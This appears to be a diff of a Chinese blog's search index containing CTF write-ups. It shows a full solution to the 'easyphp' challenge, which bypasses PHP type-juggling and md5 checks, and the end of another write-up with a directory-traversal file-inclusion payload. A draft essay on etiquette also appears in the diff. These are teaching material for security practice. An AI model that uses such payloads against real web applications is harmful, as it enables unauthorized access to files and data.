class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) &gt; <span class="number">6000000</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &lt;= <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Emmm...再想想&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Emmm...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> &amp;&amp; <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;Hgfks.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You&#x27;re right&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p>查看传参类型以及数量<br>我们通看整个页面，发现需要传a,b,c三个参数，且均以GET方式传递。</p>
 </li>
-<li><p>分析代码</p>
+<li><p>参数a的要求<br>我们重点看这段源代码：<br><code>if(isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">isset() 	判断参数的值是否存在</span><br><span class="line">intval()	用于获取变量的整数值</span><br><span class="line">strlen()	判断参数长度</span><br></pre></td></tr></table></figure>
+<p><a href="https://www.runoob.com/php/php-intval-function.html">intval()函数</a></p>
 </li>
+</ol>
+<p>函数的作用搞清楚后，接下来便是弄清楚符合的条件。<br>既要参数a的值大于600000又要长度小于3，那么只能用科学计数法。<br>当a&#x3D;1e5时，十进制数值为10000<br>由此可知，参数a的选值可以为:1e7&#x2F;8&#x2F;9</p>
+<ol start="3">
+<li>参数b的要求<br>我们重点看这段源代码：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr 	返回字符串的一部分</span><br><span class="line">md5 	计算括号内参数的md5值</span><br></pre></td></tr></table></figure>
+<a href="https://www.runoob.com/php/func-string-substr.html">substr()函数</a></li>
+</ol>
+<p>这段代码翻译过来意思为：<br>参数b的md5值的最后6位是否全等于’8b184b’。<br>这种情况我们用手算是无法计算的，于是需要用PHP写一个简单的脚本来获取符合条件的值：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span>&lt;<span class="number">100000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>),-<span class="number">6</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>最终得出参数b的值为：53724</p>
+<ol start="4">
+<li>参数c的要求<br>我们重点看这段代码：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
 </ol>
 <ul>
-<li><p>变量前的&amp;符号<br>$变量前加&amp;符号，表示引用，也即引用传递。</p>
-</li>
-<li><p>白名单数组</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>is_string()函数<br>该函数是判断内部的变量是否为字符串</p>
-</li>
-<li><p>mb_substr()函数<br>该函数是获取部分字符串</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$str</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$start</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$length</span> = <span class="literal">NULL</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">mb_internal_encoding</span>()</span><br><span class="line">): <span class="keyword">string</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">str</span></span><br><span class="line"><span class="comment">从该 string 中提取子字符串。</span></span><br><span class="line"><span class="comment">start</span></span><br><span class="line"><span class="comment">如果 start 不是负数，返回的字符串会从 str 第 start 的位置开始，从 0 开始计数。举个例子，字符串 &#x27;abcdef&#x27;，位置 0 的字符是 &#x27;a&#x27;，位置 2 的字符是 &#x27;c&#x27;，以此类推。</span></span><br><span class="line"><span class="comment">如果 start 是负数，返回的字符串是从 str 末尾处第 start 个字符开始的。</span></span><br><span class="line"><span class="comment">length</span></span><br><span class="line"><span class="comment">str 中要使用的最大字符数。如果省略了此参数或者传入了 NULL，则会提取到字符串的尾部。</span></span><br><span class="line"><span class="comment">encoding</span></span><br><span class="line"><span class="comment">encoding 参数为字符编码。如果省略或是 null，则使用内部字符编码。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
-<p>根据字符数执行一个多字节安全的 substr() 操作。 位置是从 str 的开始位置进行计数。 第一个字符的位置是 0。第二个字符的位置是 1，以此类推。</p>
-</li>
-<li><p>mb_strpos()函数<br>该函数是查找字符串在另一个字符串中首次出现的位置</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_strpos</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$haystack</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$needle</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$encoding</span> = <span class="title function_ invoke__">mb_internal_encoding</span>()</span><br><span class="line">): <span class="keyword">int</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">haystack</span></span><br><span class="line"><span class="comment">要被检查的 string。</span></span><br><span class="line"><span class="comment">needle</span></span><br><span class="line"><span class="comment">在 haystack 中查找这个字符串。 和 strpos() 不同的是，数字的值不会被当做字符的顺序值。</span></span><br><span class="line"><span class="comment">offset</span></span><br><span class="line"><span class="comment">搜索位置的偏移。如果没有提供该参数，将会使用 0。负数的 offset 会从字符串尾部开始统计。</span></span><br><span class="line"><span class="comment">encoding</span></span><br><span class="line"><span class="comment">encoding 参数为字符编码。如果省略或是 null，则使用内部字符编码。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
-<p>基于字符数执行一个多字节安全的 strpos() 操作。 第一个字符的位置是 0，第二个字符的位置是 1，以此类推。</p>
-</li>
-<li><p>is_array()函数<br>该函数是判断第1个变量是否在第2个数组中</p>
-</li>
-<li><p>empty()函数<br>该函数是检查变量是否为空。<br>当变量不存在、值为空、等于 0、为 false 时，返回 true。否则返回 false。</p>
-</li>
-<li><p>emmm::checkFile()<br>输出emmm函数的返回值</p>
-</li>
+<li>确定c[“m”]的值<br>通过代码可知，我们需要json格式的参数c。<br>参数c需要满足数组格式，且c[“m”]的类型不能为数字类型，且c[“m”]的值需要大于2022。<br>我们知道在php中，当字符串的首位为字符，并与整数比较时，字符串的值会转化为0，举例而言就是’a123’会变成0；<br>但是当字符串首位为数字，并与整数比较时，此时字符串会将字符之前的数字与整数比较，比如：’1a23’会变为1，’123a’会变为123</li>
 </ul>
-<p>PHP函数代码都解析完毕后，那么我们可以知道传入的参需要满足以下条件：<br>不为空，是字符串，<br>第1个问号(?)前的字符在白名单内</p>
-<ol start="3">
-<li>构造语句<br>我们已经知道了条件，接下来就是构造语句来满足条件。可以看到有include函数，所以我们想到文件包含漏洞。<br>使用目录穿越（..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;）的方式可以访问到父目录，从而访问到ffffllllaaaagggg。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=hint.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-拿到flag</li>
-</ol>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>PHP代码看得太少了，导致一堆代码都看不懂！</p>
+<p>于是我们可以构造出c[“m”]的值为：12345a</p>
+<ul>
+<li>确定c[“n”]的值<br>通过代码可知c[“n”]的类型为数组，且数组中有2个值，且c[“n”][0]的类型也是数组。大致为[[x,x,…],x]<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array_search 	在数组中搜索某个键值，并返回对应的键名</span><br></pre></td></tr></table></figure>
+<a href="https://www.runoob.com/php/func-array-search.html">array_search()函数</a><br>可知该函数是查找值相同的元素，那么类型不同也可以。<br>那么此时就产生了两种可选的值：0或’DGGJ’<br>但由于下面的foreach不能与DGGJ匹配，因此我们只能选0<br>因此c[“n”]的值为：[[0,2],0]</li>
+</ul>
+<p>最终payload为：<br><code>/?a=1e9&amp;b=53724&amp;c=&#123;&quot;m&quot;:&quot;12345a&quot;, &quot;n&quot;:[[0,2],0]&#125;</code><br>提交得到flag。</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这道题倒是让我受到不少收获，感觉蛮好。是我应该会却不会的内容，代码审计能力提升了~</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/weixin_46906325/article/details/127154789">攻防世界web新手区easyphp题解writeup</a><br><a href="https://blog.csdn.net/qq_56426046/article/details/127194240?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-127194240-blog-127154789.pc_relevant_3mothn_strategy_recovery&spm=1001.2101.3001.4242.1&utm_relevant_index=3">攻防世界easyphp解题wp</a></p>
 ]]></content>
       <categories>
         <category>CTF</category>
-        <category>文件包含</category>
+        <category>PHP</category>
       </categories>
       <tags>
         <tag>CTF</tag>
         <tag>PHP</tag>
-        <tag>文件包含</tag>
       </tags>
   </entry>
   <entry>
@@ -7663,56 +7733,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </categories>
       <tags>
         <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>攻防世界_easyphp</title>
-    <url>/2022/12/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_easyphp/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做了这题才知道自己的php掌握的有多么糟糕…</p>
-<span id="more"></span>
-<h1 id="题目来源"><a href="#题目来源" class="headerlink" title="题目来源"></a>题目来源</h1><p>攻防世界-&gt;easyphp</p>
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>首先是页面代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) &gt; <span class="number">6000000</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &lt;= <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Emmm...再想想&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Emmm...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> &amp;&amp; <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;Hgfks.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You&#x27;re right&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<ol>
-<li><p>查看传参类型以及数量<br>我们通看整个页面，发现需要传a,b,c三个参数，且均以GET方式传递。</p>
-</li>
-<li><p>参数a的要求<br>我们重点看这段源代码：<br><code>if(isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3)</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">isset() 	判断参数的值是否存在</span><br><span class="line">intval()	用于获取变量的整数值</span><br><span class="line">strlen()	判断参数长度</span><br></pre></td></tr></table></figure>
-<p><a href="https://www.runoob.com/php/php-intval-function.html">intval()函数</a></p>
-</li>
-</ol>
-<p>函数的作用搞清楚后，接下来便是弄清楚符合的条件。<br>既要参数a的值大于600000又要长度小于3，那么只能用科学计数法。<br>当a&#x3D;1e5时，十进制数值为10000<br>由此可知，参数a的选值可以为:1e7&#x2F;8&#x2F;9</p>
-<ol start="3">
-<li>参数b的要求<br>我们重点看这段源代码：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr 	返回字符串的一部分</span><br><span class="line">md5 	计算括号内参数的md5值</span><br></pre></td></tr></table></figure>
-<a href="https://www.runoob.com/php/func-string-substr.html">substr()函数</a></li>
-</ol>
-<p>这段代码翻译过来意思为：<br>参数b的md5值的最后6位是否全等于’8b184b’。<br>这种情况我们用手算是无法计算的，于是需要用PHP写一个简单的脚本来获取符合条件的值：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">1</span>; <span class="variable">$i</span>&lt;<span class="number">100000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>),-<span class="number">6</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$i</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>最终得出参数b的值为：53724</p>
-<ol start="4">
-<li>参数c的要求<br>我们重点看这段代码：<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no......&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li>
-</ol>
-<ul>
-<li>确定c[“m”]的值<br>通过代码可知，我们需要json格式的参数c。<br>参数c需要满足数组格式，且c[“m”]的类型不能为数字类型，且c[“m”]的值需要大于2022。<br>我们知道在php中，当字符串的首位为字符，并与整数比较时，字符串的值会转化为0，举例而言就是’a123’会变成0；<br>但是当字符串首位为数字，并与整数比较时，此时字符串会将字符之前的数字与整数比较，比如：’1a23’会变为1，’123a’会变为123</li>
-</ul>
-<p>于是我们可以构造出c[“m”]的值为：12345a</p>
-<ul>
-<li>确定c[“n”]的值<br>通过代码可知c[“n”]的类型为数组，且数组中有2个值，且c[“n”][0]的类型也是数组。大致为[[x,x,…],x]<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array_search 	在数组中搜索某个键值，并返回对应的键名</span><br></pre></td></tr></table></figure>
-<a href="https://www.runoob.com/php/func-array-search.html">array_search()函数</a><br>可知该函数是查找值相同的元素，那么类型不同也可以。<br>那么此时就产生了两种可选的值：0或’DGGJ’<br>但由于下面的foreach不能与DGGJ匹配，因此我们只能选0<br>因此c[“n”]的值为：[[0,2],0]</li>
-</ul>
-<p>最终payload为：<br><code>/?a=1e9&amp;b=53724&amp;c=&#123;&quot;m&quot;:&quot;12345a&quot;, &quot;n&quot;:[[0,2],0]&#125;</code><br>提交得到flag。</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这道题倒是让我受到不少收获，感觉蛮好。是我应该会却不会的内容，代码审计能力提升了~</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/weixin_46906325/article/details/127154789">攻防世界web新手区easyphp题解writeup</a><br><a href="https://blog.csdn.net/qq_56426046/article/details/127194240?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-127194240-blog-127154789.pc_relevant_3mothn_strategy_recovery&spm=1001.2101.3001.4242.1&utm_relevant_index=3">攻防世界easyphp解题wp</a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
@@ -8043,21 +8063,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>浅谈礼仪的对象</title>
-    <url>/2022/11/26/%E7%A4%BC%E4%BB%AA%E7%9A%84%E5%AF%B9%E8%B1%A1/</url>
-    <content><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>前些年在某本杂志上看到太宰治说的一段话。那段话大致意思是说：我们有晚辈对长辈的礼仪，学生对老师的礼仪；却没有长辈对晚辈的礼仪，老师对学生的礼仪。给我带来了极大的震撼，也是因此产生了写这篇文章的想法。<br>文章还在草稿中…不必看</p>
-<span id="more"></span>
-<h1 id="理所应当的礼仪"><a href="#理所应当的礼仪" class="headerlink" title="理所应当的礼仪"></a>理所应当的礼仪</h1><p>像我这样愚笨之人，从不会思考这样的事，只把这样的礼仪当作是理所当然的事。<br>也即，我被社会，所同化了。<br>为什么这么说呢？<br>仔细思考一下便知，我们的周围，无不充斥着晚辈应当尊敬长辈，学生应当尊重老师，这样的氛围。比如什么一日为师终生为父这样的话。<br>但从来没有长辈尊重晚辈，老师尊重学生的话出现。现实中也常常看到这样的例子，有的老师羞辱学生而学生不敢还嘴，长辈打骂晚辈却不会受到谴责。<br>仿佛只要是成为了这样一种强势地位的人，就能为所欲为。<br>说到底，为什么要对长辈，老师这样的人有尊重的礼仪呢？<br>这些礼仪最初是由什么人提出的呢？难道其实说，这不过是强者剥削弱者的一种手段吗？<br>礼仪道德的遵守与否，应当遵循自愿，而不是成为一种强制行为。对于敬爱的长辈老师，晚辈学生可以自主选择遵守礼仪。对于不值得尊重的，也可以选择不遵守。而不是依靠这样一种强势地位去压迫弱势地位的晚辈学生。<br>说到底，晚辈学生，根本上而言，没有选择权。一切都是上位者提出的规则。他们受到礼仪，只是单纯地享受。<br>未完待续…</p>
-]]></content>
-      <categories>
-        <category>随想</category>
-      </categories>
-      <tags>
-        <tag>随想</tag>
-        <tag>礼仪</tag>
-      </tags>
-  </entry>
